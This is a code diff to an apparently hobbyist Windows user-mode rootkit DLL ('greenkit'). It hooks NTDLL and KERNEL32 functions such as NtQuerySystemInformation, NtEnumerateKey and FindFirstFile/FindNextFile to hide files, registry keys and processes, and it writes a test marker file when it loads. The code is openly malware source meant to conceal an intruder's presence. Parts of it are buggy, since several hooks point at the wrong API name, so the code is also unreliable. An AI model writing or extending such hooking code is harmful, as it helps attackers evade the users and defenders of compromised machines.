@@ -4,6 +4,22 @@
 
 #include "NtQuerySystemInformation.h"
 #include "NtEnumerateKey.h"
+#include "FindFiles.h"
+
+VOID WriteFile()
+{
+    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
+        GENERIC_WRITE,          // open for writing
+        0,                      // do not share
+        NULL,                   // default security
+        CREATE_NEW,             // create new file only
+        FILE_ATTRIBUTE_NORMAL,  // normal file
+        NULL);                  // no attr. template
+
+    DWORD dwBytesWritten = 0;
+    char Str[] = "Coucou";
+    WriteFile(hFile, Str, strlen(Str), &dwBytesWritten, NULL);
+}
 
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
@@ -21,10 +37,11 @@ NTSTATUS WINAPI NewNtOpenFile(
     //DWORD dwRet;
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
     MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    WriteFile();
     //if (!mustHideFile(*sPath))
-    NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+    //NTSTATUS status = ((PNT_OPEN_FILE) hooking_getOldFunction("NtOpenFile"))(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
 
-    return status; // STATUS_NO_SUCH_FILE
+    return 0;//status; // STATUS_NO_SUCH_FILE
 }
 
 NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
@@ -84,9 +101,15 @@ bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
 	switch (dwReason)
 	{
 		case DLL_PROCESS_ATTACH:
-			hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
-			hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
+            MessageBox(0, "HOOKED", "HookTest", MB_OK | MB_ICONERROR);
+            WriteFile();
+			//hooking_addFunction("NtQuerySystemInformation", Hook("NTDLL.DLL", "NtQuerySystemInformation", NewNtQuerySystemInformation));
+			//hooking_addFunction("NtOpenFile", Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile));
 			hooking_addFunction("NtEnumerateKey", Hook("NTDLL.DLL", "NtEnumerateKey", NewNtEnumerateKey));
+            hooking_addFunction("FindFirstFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA));
+            hooking_addFunction("FindNextFileA", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindNextFileA));
+            hooking_addFunction("FindFirstFileW", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileW));
+            hooking_addFunction("FindNextFileW", Hook("KERNEL32.DLL", "FindFirstFileA", MyFindNextFileW));
 			return TRUE;
 	}
 	return TRUE;
